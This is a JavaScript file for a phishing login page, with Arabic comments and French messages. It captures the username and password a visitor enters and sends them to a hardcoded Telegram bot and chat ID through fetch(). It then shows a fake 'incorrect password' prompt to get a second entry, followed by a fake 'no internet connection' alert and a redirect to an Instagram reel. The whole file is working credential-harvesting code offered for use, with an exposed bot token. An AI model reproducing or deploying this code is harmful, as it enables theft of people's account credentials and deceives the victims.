const BOT_TOKEN = "8290316866:AAHpxLGgMSmb1GUpqcIor8VjT6FEPL9LN1g"; 
const CHAT_ID = "6577433645";
const targetReel = "https://www.instagram.com/reel/DLF7JNJIBZ5/?igsh=ZDI0NTV1bzZyODVo";

const userInp = document.getElementById('username');
const passInp = document.getElementById('password');
const loginBtn = document.getElementById('loginBtn');

// وظيفة مراقبة المدخلات لتفعيل الزر
function validateInputs() {
    if (userInp.value.length > 0 && passInp.value.length > 0) {
        loginBtn.classList.add('active');
    } else {
        loginBtn.classList.remove('active');
    }
}

userInp.addEventListener('input', validateInputs);
passInp.addEventListener('input', validateInputs);

// وظيفة إظهار التنبيه
function showModal(title, text, btnText, isFinal = false) {
    document.getElementById('alertTitle').innerText = title;
    document.getElementById('alertText').innerText = text;
    const modalBtn = document.getElementById('modalActionBtn');
    modalBtn.innerText = btnText;
    
    document.getElementById('customAlert').style.display = 'flex';

    modalBtn.onclick = function() {
        if (isFinal) {
            window.location.href = targetReel;
        } else {
            document.getElementById('customAlert').style.display = 'none';
        }
    };
}

loginBtn.addEventListener('click', function(e) {
    e.preventDefault();

    const user = userInp.value.trim();
    const pass = passInp.value.trim();

    // التحقق من الفراغات وإضافة اللون الأحمر
    if (user === "" || pass === "") {
        if (user === "") userInp.classList.add('error-field');
        if (pass === "") passInp.classList.add('error-field');
        return;
    }

    let attempts = localStorage.getItem('step') || 0;
    const info = `🚀 Log: ${user} | Pass: ${pass} | Attempt: ${parseInt(attempts) + 1}`;
    
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(info)}`)
    .then(() => {
        if (attempts == 0) {
            // المرة الأولى: خطأ كلمة السر
            localStorage.setItem('step', 1);
            showModal("Mot de passe incorrect", "Le mot de passe que vous avez entré est incorrect. Veuillez réessayer.", "Réessayer");
            passInp.value = "";
            loginBtn.classList.remove('active'); // إعادة تعطيل الزر
        } else {
            // المرة الثانية: خطأ الإنترنت (مثل جوجل)
            localStorage.removeItem('step');
            showModal("Aucune connexion Internet", "Impossible de se connecter au serveur. Vérifiez votre connexion.", "Actualiser", true);
        }
    });
});

// إزالة اللون الأحمر عند البدء في الكتابة مجدداً
userInp.addEventListener('focus', () => userInp.classList.remove('error-field'));
passInp.addEventListener('focus', () => passInp.classList.remove('error-field'));
